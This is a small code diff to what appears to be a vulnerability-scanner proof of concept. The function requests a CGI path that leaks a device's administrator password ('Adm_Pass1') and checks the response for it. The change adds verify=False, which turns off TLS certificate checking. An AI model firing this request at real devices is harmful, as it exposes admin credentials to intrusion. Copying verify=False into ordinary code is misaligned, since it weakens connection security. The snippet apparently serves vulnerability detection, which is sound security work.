@@ -25,7 +25,7 @@ def poc(url):
     payload = "/cgi-bin/readfile.cgi?query=ADMINID"
     target_url = get_domain(url) + payload
     try:
-        r = requests.get(target_url, timeout=10)
+        r = requests.get(target_url, timeout=10, verify=False)
         if 'var Adm_Pass1' in r.content:
             return target_url
     except Exception:
